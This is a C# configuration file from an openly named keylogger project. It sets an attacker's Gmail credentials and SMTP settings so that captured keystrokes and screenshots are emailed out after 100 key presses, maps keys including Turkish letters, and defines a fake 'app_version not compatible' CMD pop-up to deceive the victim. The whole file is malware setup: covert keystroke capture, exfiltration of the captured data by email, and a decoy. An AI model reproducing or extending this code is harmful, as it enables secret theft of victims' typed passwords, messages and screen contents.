using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Keylogger
{
    public class Configurations
    {
        public struct Key
        {
            private readonly string key;
            private readonly string key_raw;
            public Key(string key, string key_raw = null)
            {
                this.key = key;
                this.key_raw = key_raw;
            }
            public string this[bool raw_mode]
            {
                get 
                {
                    if (raw_mode && key_raw != null)
                        return key_raw.ToString();
                    else if (!raw_mode && key != null)//normal key 
                        return Program.letter_case<string>(key.ToString());
                    else if (key_raw != null)
                        return key_raw.ToString();
                    else if (raw_mode && key_raw == null)
                        return key;
                    return $"error at assigning {key} {key_raw} key ";
                }
            }
        }
        /// <summary>
        /// raw buttons are special buttons(not letters) raw buttons aren't affected by caps lock ex: [SPACE],[BACKSPACE]
        /// </summary>
        public static readonly bool raw_button_mode = false;
        public static readonly string email = "youremail@gmail.com";
        public static readonly string email_password = "yourpass";
        /// <summary>
        /// if total pressed buttons are equal to key_death_line logs will be sent to the attackers email
        /// </summary>
        public static readonly int key_death_line = 100;
        /// <summary>
        /// int: ascii number, string: key to show up when pressed there is some letters that doesnt show up correctly you can assign keys or override keys 
        /// </summary>
        public static readonly Dictionary<int, Key> custom_letters = new Dictionary<int, Key>()
        {
            {221,new Key("ü") }, {219,new Key("ğ") },
            {191,new Key("ö") }, {73,new Key("ı") },
            {186,new Key("ş") }, {222,new Key("i") },
            {220,new Key("ç") },{188,new Key(",") },
            {190,new Key(".") }, {162,new Key(null,"[CTRL]") },
            {164,new Key(null,"[ALT]") }, {32,new Key(" ", "[SPACE]") },
            {160,new Key(null,"[SHIFT]") }, {161,new Key(null,"[SHIFT]") },
            {13,new Key(null,"[ENTER]") }
        };
        public static readonly string put_this_between_every_key = "";
        public static readonly Action fake_pop_up = () => 
        { 
            System.Diagnostics.Process.Start("CMD.exe", "/k echo ERROR0x52: app_version not compatible"); 
        };
        public static readonly int take_screen_shot_delay = 2000; 

        /// <summary>
        /// Advanced
        /// </summary>
        public static class email_sender_configurations
        {
            public static readonly string smtp_host = @"smtp.gmail.com";
            public static readonly int smtp_port = 587;
            /// <summary>
            /// Program.ss_list.Count is screenshot length
            /// </summary>
            public static readonly int client_time_out = 10000+(Program.ss_list.Count * 3000);

        }
    }
}
